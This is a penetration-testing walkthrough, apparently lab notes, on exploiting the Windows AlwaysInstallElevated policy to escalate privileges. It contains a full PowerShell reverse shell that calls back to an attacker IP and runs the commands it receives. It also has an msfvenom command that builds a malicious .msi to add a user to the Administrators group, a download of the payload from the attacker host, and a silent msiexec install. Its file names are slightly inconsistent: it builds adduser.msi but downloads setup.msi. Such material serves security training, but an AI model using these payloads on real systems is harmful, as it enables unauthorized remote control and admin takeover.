# Registry (AlwaysInstallElevated)

“AlwaysInstallElevated” is a setting in Windows policy that permits the Windows Installer packages (.msi files) to be installed with administrative privileges. This configuration can be adjusted through the Group Policy Editor (gpedit.msc). When activated, it enables any user, even those with restricted privileges, to install software with elevated rights. This option is available under both the Computer Configuration and User Configuration sections within the Group Policy.

Detection: 

To verify whether this misconfiguration exists, establish a **reverse shell** connection to the target system first (PowerShell-based shell shown below):

```jsx
$LHOST = "10.6.42.239"; $LPORT = 1234; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```
![image](https://github.com/user-attachments/assets/2dfa7286-6a8c-4863-9a13-60609aaa4434)


Once connected to the victim machine, check the registry for the AlwaysInstallElevated policy status:

```jsx
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

![image](https://github.com/user-attachments/assets/9a169250-8056-4690-ad50-55f30b4682b1)


If the output shows the value `AlwaysInstallElevated = 1` in **both** locations, the system is vulnerable to `.msi` privilege escalation.

💥 Exploitation

### Attacker (Kali VM):

1. Generate a malicious `.msi` file that adds the current user to the local administrators group using `msfvenom`:

```jsx
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi > adduser.msi
```

> Note: Replace user with the actual low-privileged username you're operating under.
> 
1. Host the payload using an HTTP server on your Kali machine:

### Victim (Windows VM):

Download the `.msi` file from the attacker's machine:

```jsx
Invoke-WebRequest -Uri "http://10.6.42.239:8999/setup.msi" -OutFile "setup.msi"
```

Execute the `.msi` file using **msiexec** with silent install flags:

```jsx
msiexec /quiet /qn /i adduser.msi

```

## Post-Exploitation Verification

Confirm that the user has been successfully added to the **Administrators** group:

![image](https://github.com/user-attachments/assets/093e1de1-fb7b-460e-9e08-7d07e09c8e69)


You should see the specified user listed, confirming privilege escalation.
